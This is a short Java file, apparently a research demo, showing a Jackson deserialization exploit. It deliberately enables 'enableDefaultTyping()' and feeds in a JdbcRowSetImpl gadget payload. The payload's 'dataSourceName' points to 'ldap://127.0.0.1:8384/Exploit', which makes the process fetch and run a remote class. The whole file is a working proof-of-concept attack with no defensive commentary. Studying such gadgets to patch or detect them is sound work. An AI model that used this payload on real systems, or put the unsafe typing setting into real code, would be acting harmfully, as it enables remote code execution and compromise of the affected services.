package me.mole.jackson.demo;

import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;

public class Jackson1 {
    public static void main(String[] args) {
        String payload =
                "[\"com.sun.rowset.JdbcRowSetImpl\", {\"dataSourceName\":\"ldap://127.0.0.1:8384/Exploit\",\"autoCommit\":true}]";

        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();

        try {
            Object obj = mapper.readValue(payload, Object.class);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
